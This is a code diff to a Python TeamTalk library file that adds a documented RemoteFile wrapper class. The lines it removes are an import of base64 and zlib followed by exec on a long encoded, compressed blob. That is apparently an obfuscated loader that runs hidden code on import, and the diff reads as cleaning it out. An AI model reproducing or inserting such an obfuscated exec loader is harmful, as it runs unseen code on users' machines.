@@ -1,2 +1,44 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJydVMFu2zAMvfsrCO8SA5mxHXYx0AHB2gG5DVluwyAoNp1wlWVPogtkQ/99ki078pq1Q3WSRPLxiY9UmqZ7lA1LdQ81KYT28ANLztM0TZLatA3komdSFqjpWsMgjsiCWTg/IZkNHXrGJElKJa2FHTYt42cHVCTgloPZYWfQomYLMqTQbuez7n1Wi+YBTQ5fT22vKtAtwwGBtGWpmSRjBRUZx0mdR1Yet8IahCBNLMTKoqrXwOEZYgwtcQ2dPKtWVtnIJfDZuiCSin6hBT5hRBmmyDyZAzbmaC/hfj3JU8DewXRnf5lPz9oGY4QZgwRmBWz07AFtDba6zy+E8pj3vPfPzScWcPOU0NKzPEmtUTlHJZtDJYfbYomSe1GD4ypwy/Wn8WJ7my0RR8WeBxx9lnEB2AWGXaylZROkzODtR3DHhWo75N5o30LOQvoIZmoryeQaytXuZTEDyFLPzSsQr8liBnCo0y9jJ1wCV77rhZYN3vweCjGfH9fDRAiqYgtV0711XRpb/NnZelfdCG46ekvn6yqYLsbLzWOWArxxE/ZTFnD34d37uP6uA/w4z+PkAQtfmuyqDr40D1L1ONXJdlhSTW5a519hMpmhEsOLnp2sMaUfJr+bome4l4Tc/welGEOSxb97YfK7M6Y1BWz//Tayw1dVt72u8lDVq31B9fgc0v4fGzt8mTV0ziCXEBWV7lP75mO+z26oLF4Nuvodr+JxG6XMkj+hBtvD')))
+"""Teamtalk file object."""
+
+from ._utils import _get_tt_obj_attribute
+
+
+class RemoteFile:
+    """Represents a file on a TeamTalk server. Should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, payload):
+        """Initializes the RemoteFile instance.
+
+        Args:
+            teamtalk_instance: The pytalk.TeamTalkInstance instance.
+            payload: An instance of sdk.RemoteFile.
+        """
+        self.teamtalk = teamtalk_instance
+        self.channel = lambda self: self.teamtalk.get_channel(payload.nChannelID)
+        self.server = lambda self: self.teamtalk.server
+        self.payload = payload
+
+    def __str__(self) -> str:
+        """Returns a string representation of the RemoteFile instance.
+
+        Returns:
+            A string representation of the RemoteFile instance.
+        """
+        return f"Pytalk.RemoteFile(file_name={self.file_name}, file_id={self.file_id}, file_size={self.file_size}, username={self.username}, upload_time={self.upload_time})"  # noqa: E501
+
+    def __getattr__(self, name: str):
+        """Returns the value of the specified attribute of the remote file.
+
+        Args:
+            name: The name of the attribute.
+
+        Returns:
+            The value of the specified attribute.
+
+        Raises:
+            AttributeError: If the specified attribute is not found. # noqa
+        """
+        if name in dir(self):
+            return self.__dict__[name]
+        else:
+            return _get_tt_obj_attribute(self.payload, name)
